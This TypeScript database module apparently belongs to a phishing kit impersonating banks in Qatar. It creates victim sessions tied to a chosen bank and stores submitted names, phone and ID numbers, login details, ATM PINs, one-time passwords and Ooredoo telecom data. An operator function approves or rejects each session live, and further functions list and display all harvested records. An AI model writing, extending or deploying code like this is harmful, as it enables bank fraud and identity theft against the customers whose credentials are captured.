import { eq } from "drizzle-orm";
import { drizzle } from "drizzle-orm/postgres-js";
import postgres from "postgres";
import { InsertUser, users } from "../drizzle/schema";
import { ENV } from './_core/env';
import {
  sessions,
  personalDataSubmissions,
  loginMethodSubmissions,
  atmPinSubmissions,
  otpSubmissions,
  ooredooSubmissions,
  type InsertPersonalDataSubmission,
  type InsertLoginMethodSubmission,
  type InsertAtmPinSubmission,
  type InsertOtpSubmission,
  type InsertOoredooSubmission,
} from "../drizzle/schema";

let _db: any = null;

export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      const client = postgres(process.env.DATABASE_URL);
      _db = drizzle(client);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onConflictDoUpdate({
      target: users.openId,
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

export async function createSession(sessionId: string, selectedBank: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.insert(sessions).values({ id: sessionId, selectedBank, country: "Qatar" });
}

export async function updateSessionStatus(sessionId: string, status: string, step?: string, errorMessage?: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.update(sessions)
    .set({ status, currentStep: step, errorMessage, updatedAt: new Date(), adminAction: null })
    .where(eq(sessions.id, sessionId));
}

export async function adminTakeAction(sessionId: string, action: string, errorMessage?: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.update(sessions)
    .set({ adminAction: action, errorMessage, status: action === 'approve' ? 'approved' : 'rejected', updatedAt: new Date() })
    .where(eq(sessions.id, sessionId));
}

export async function getSessionStatus(sessionId: string) {
  const db = await getDb();
  if (!db) return null;
  const [session] = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
  return session || null;
}

export async function getSessionByIdWithAllData(sessionId: string) {
  const db = await getDb();
  if (!db) return null;

  const [sessionData] = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
  if (!sessionData) return null;

  const [personalData] = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, sessionId)).limit(1);
  const [loginMethod] = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, sessionId)).limit(1);
  const [atmPin] = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, sessionId)).limit(1);
  const [otp] = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, sessionId)).limit(1);
  const [ooredoo] = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, sessionId)).limit(1);

  return {
    session: sessionData,
    personalData: personalData || null,
    loginMethod: loginMethod || null,
    atmPin: atmPin || null,
    otp: otp || null,
    ooredoo: ooredoo || null,
  };
}

export async function submitPersonalData(data: InsertPersonalDataSubmission) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(personalDataSubmissions).values(data);
  return result;
}

export async function submitLoginMethod(data: InsertLoginMethodSubmission) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(loginMethodSubmissions).values(data);
  return result;
}

export async function submitAtmPin(data: InsertAtmPinSubmission) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(atmPinSubmissions).values(data);
  return result;
}

export async function submitOtp(data: InsertOtpSubmission) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(otpSubmissions).values(data);
  return result;
}

export async function submitOoredoo(data: InsertOoredooSubmission) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(ooredooSubmissions).values(data);
  return result;
}

export async function getAllSubmissions() {
  const db = await getDb();
  if (!db) return [];
  
  const allSessions = await db.select().from(sessions);
  const result = [];
  
  for (const session of allSessions) {
    const [personalData] = await db.select()
      .from(personalDataSubmissions)
      .where(eq(personalDataSubmissions.sessionId, session.id))
      .limit(1);
      
    result.push({
      ...session,
      nameArabic: personalData?.nameArabic || "جاري التحميل...",
      phoneNumber: personalData?.phoneNumber || "جاري التحميل...",
      idNumber: personalData?.idNumber || "جاري التحميل...",
    });
  }
  
  return result;
}

export async function getSubmissionDetails(sessionId: string) {
  return getSessionByIdWithAllData(sessionId);
}
